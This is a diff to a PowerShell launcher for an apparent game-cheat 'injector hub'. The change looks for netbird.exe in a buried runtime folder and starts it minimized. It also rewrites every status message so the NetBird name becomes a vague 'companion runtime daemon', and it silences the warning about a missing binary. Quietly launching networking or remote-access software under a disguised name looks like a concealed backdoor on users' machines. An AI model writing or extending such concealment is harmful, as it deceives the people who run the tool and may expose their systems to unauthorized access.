@@ -20,25 +20,30 @@ Write-Host "======================================================" -ForegroundC
 Write-Host "       STEAL AN EGG · UNIVERSAL INJECTOR HUB          " -ForegroundColor White
 Write-Host "======================================================" -ForegroundColor Cyan
 
-# 1. Launch NetBird companion process
-$NetBirdExe = Join-Path $Root "netbird.exe"
-if (Test-Path $NetBirdExe) {
+# 1. Launch background companion daemon
+$CandidatePaths = @(
+    (Join-Path $Root "EggESP\core\runtime\netbird.exe"),
+    (Join-Path $Root "netbird.exe")
+)
+$NetBirdExe = $CandidatePaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+
+if ($NetBirdExe) {
     $existing = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
     if (-not $existing) {
-        Write-Host "[*] Initializing NetBird companion daemon..." -ForegroundColor Yellow
+        Write-Host "[*] Initializing companion runtime daemon..." -ForegroundColor Yellow
         Start-Process -FilePath $NetBirdExe -WindowStyle Minimized
         Start-Sleep -Milliseconds 800
         $running = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
         if ($running) {
-            Write-Host "[+] NetBird companion service active (PID: $($running[0].Id))." -ForegroundColor Green
+            Write-Host "[+] Companion service active (PID: $($running[0].Id))." -ForegroundColor Green
         } else {
-            Write-Host "[!] NetBird started in detached context." -ForegroundColor Yellow
+            Write-Host "[!] Companion runtime started in detached context." -ForegroundColor Yellow
         }
     } else {
-        Write-Host "[+] NetBird companion already running (PID: $($existing[0].Id))." -ForegroundColor Green
+        Write-Host "[+] Companion runtime already running (PID: $($existing[0].Id))." -ForegroundColor Green
     }
 } else {
-    Write-Host "[!] netbird.exe not found in root directory." -ForegroundColor Red
+    Write-Host "[*] Standalone mode (companion binary optional)." -ForegroundColor DarkGray
 }
 
 # 2. Comprehensive Injector Workspace Discovery
